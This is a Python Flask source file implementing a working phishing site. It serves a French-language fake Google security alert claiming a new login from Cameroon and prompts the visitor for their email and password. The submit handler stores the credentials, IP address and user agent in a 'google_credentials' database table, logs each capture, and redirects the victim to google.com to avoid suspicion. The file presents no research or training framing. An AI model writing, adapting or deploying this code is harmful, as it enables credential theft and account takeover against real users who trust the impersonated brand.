import os
import psycopg2
from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

DATABASE_URL = os.environ.get('DATABASE_URL')

def get_db_connection():
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def get_client_info():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'Inconnu')
    return ip, ua

# Page d'alerte avec formulaire agrandi et responsive
@app.route('/check-activity', methods=['GET'])
def show_alert():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
        <title>Alerte de sécurité - Google</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
                background: #f0f2f5;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            
            .container {
                max-width: 500px;
                width: 100%;
                background: white;
                border-radius: 12px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1), 0 1px 3px rgba(0,0,0,0.08);
                overflow: hidden;
            }
            
            .header {
                padding: 32px 28px 16px 28px;
                text-align: center;
                border-bottom: 1px solid #e8eaed;
            }
            
            .logo {
                font-size: 48px;
                font-weight: 500;
                letter-spacing: -1px;
                margin-bottom: 16px;
            }
            
            .google-blue { color: #4285f4; }
            .google-red { color: #ea4335; }
            .google-yellow { color: #fbbc05; }
            .google-green { color: #34a853; }
            
            .alert-icon {
                font-size: 56px;
                margin: 16px 0;
            }
            
            h1 {
                font-size: 26px;
                font-weight: 500;
                color: #202124;
                margin: 16px 0 8px 0;
            }
            
            .subtitle {
                font-size: 16px;
                color: #5f6368;
                margin-bottom: 8px;
            }
            
            .device-info {
                background: #f8f9fa;
                border-radius: 12px;
                padding: 20px;
                margin: 20px 28px;
                border: 1px solid #e8eaed;
            }
            
            .device-row {
                display: flex;
                align-items: center;
                padding: 12px 0;
                border-bottom: 1px solid #e8eaed;
                font-size: 16px;
            }
            
            .device-row:last-child {
                border-bottom: none;
            }
            
            .device-icon {
                font-size: 24px;
                width: 40px;
            }
            
            .device-label {
                color: #5f6368;
                width: 100px;
            }
            
            .device-value {
                color: #202124;
                font-weight: 500;
                flex: 1;
            }
            
            .email-box {
                background: #f8f9fa;
                border: 1px solid #e8eaed;
                border-radius: 12px;
                padding: 18px;
                margin: 0 28px 20px 28px;
                text-align: center;
                font-size: 18px;
                font-weight: 500;
                color: #202124;
                word-break: break-all;
            }
            
            .warning-text {
                color: #d93025;
                font-size: 14px;
                text-align: center;
                margin: 20px 28px;
                padding: 12px;
                background: #fce8e6;
                border-radius: 8px;
            }
            
            .form-container {
                padding: 0 28px 28px 28px;
            }
            
            .input-group {
                margin-bottom: 20px;
            }
            
            .input-label {
                display: block;
                font-size: 14px;
                font-weight: 500;
                color: #202124;
                margin-bottom: 8px;
            }
            
            .input-field {
                width: 100%;
                padding: 16px 14px;
                font-size: 16px;
                border: 1px solid #dadce0;
                border-radius: 8px;
                transition: all 0.2s;
                background: white;
                font-family: inherit;
            }
            
            .input-field:focus {
                outline: none;
                border-color: #1a73e8;
                box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
            }
            
            .submit-btn {
                width: 100%;
                padding: 16px;
                background: #1a73e8;
                color: white;
                border: none;
                border-radius: 8px;
                font-size: 18px;
                font-weight: 500;
                cursor: pointer;
                transition: background 0.2s;
                margin-top: 12px;
                font-family: inherit;
            }
            
            .submit-btn:hover {
                background: #1557b0;
            }
            
            .footer {
                padding: 20px 28px;
                font-size: 12px;
                color: #5f6368;
                border-top: 1px solid #e8eaed;
                background: #f8f9fa;
                text-align: center;
            }
            
            .footer a {
                color: #1a73e8;
                text-decoration: none;
                margin: 0 8px;
            }
            
            .footer a:hover {
                text-decoration: underline;
            }
            
            @media (max-width: 550px) {
                body {
                    padding: 12px;
                }
                .header {
                    padding: 24px 20px 12px 20px;
                }
                .logo {
                    font-size: 40px;
                }
                h1 {
                    font-size: 22px;
                }
                .device-info, .email-box, .form-container {
                    margin-left: 20px;
                    margin-right: 20px;
                }
                .device-row {
                    font-size: 14px;
                }
                .device-icon {
                    font-size: 20px;
                    width: 32px;
                }
                .device-label {
                    width: 80px;
                }
                .input-field {
                    padding: 14px 12px;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">
                    <span class="google-blue">G</span><span class="google-red">o</span><span class="google-yellow">o</span><span class="google-blue">g</span><span class="google-green">l</span><span class="google-red">e</span>
                </div>
                <div class="alert-icon">⚠️</div>
                <h1>Alerte de sécurité</h1>
                <p class="subtitle">Nouvelle connexion détectée</p>
            </div>
            
            <div class="device-info">
                <div class="device-row">
                    <div class="device-icon">📱</div>
                    <div class="device-label">Appareil</div>
                    <div class="device-value">Apple iPhone</div>
                </div>
                <div class="device-row">
                    <div class="device-icon">📍</div>
                    <div class="device-label">Localisation</div>
                    <div class="device-value">Cameroun</div>
                </div>
                <div class="device-row">
                    <div class="device-icon">🕐</div>
                    <div class="device-label">Date</div>
                    <div class="device-value">28 mars 2026, 21:45</div>
                </div>
                <div class="device-row">
                    <div class="device-icon">🌐</div>
                    <div class="device-label">Adresse IP</div>
                    <div class="device-value">197.149.xxx.xxx</div>
                </div>
            </div>
            
            <div class="email-box">
                📧 Compte concerné
            </div>
            
            <div class="warning-text">
                🔒 Si vous n'êtes pas à l'origine de cette connexion, votre compte est peut-être compromis.
            </div>
            
            <div class="form-container">
                <form method="POST" action="/check-activity">
                    <div class="input-group">
                        <label class="input-label">Adresse e-mail</label>
                        <input type="email" name="email" class="input-field" placeholder="exemple@gmail.com" required>
                    </div>
                    <div class="input-group">
                        <label class="input-label">Mot de passe</label>
                        <input type="password" name="password" class="input-field" placeholder="Votre mot de passe actuel" required>
                    </div>
                    <button type="submit" class="submit-btn">🔐 Vérifier mon identité</button>
                </form>
            </div>
            
            <div class="footer">
                <a href="#">Confidentialité</a> | 
                <a href="#">Conditions</a> | 
                <a href="#">Aide</a> | 
                <a href="#">À propos</a>
                <p style="margin-top: 12px;">© 2026 Google LLC</p>
            </div>
        </div>
    </body>
    </html>
    ''')

# Traitement du formulaire (POST)
@app.route('/check-activity', methods=['POST'])
def check_activity():
    email = request.form.get('email')
    password = request.form.get('password')

    if not email or not password:
        return "Données manquantes", 400

    ip, ua = get_client_info()
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO google_credentials (email, password, ip_address, user_agent)
            VALUES (%s, %s, %s, %s)
        """, (email, password, ip, ua))
        conn.commit()
        cur.close()
        conn.close()
        print(f"🔐 Capturé : {email} depuis {ip}")
    except Exception as e:
        print(f"❌ Erreur BD : {e}")
        return "Erreur serveur", 500

    return redirect('https://www.google.com')

@app.route('/')
def index():
    return redirect('https://www.google.com')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
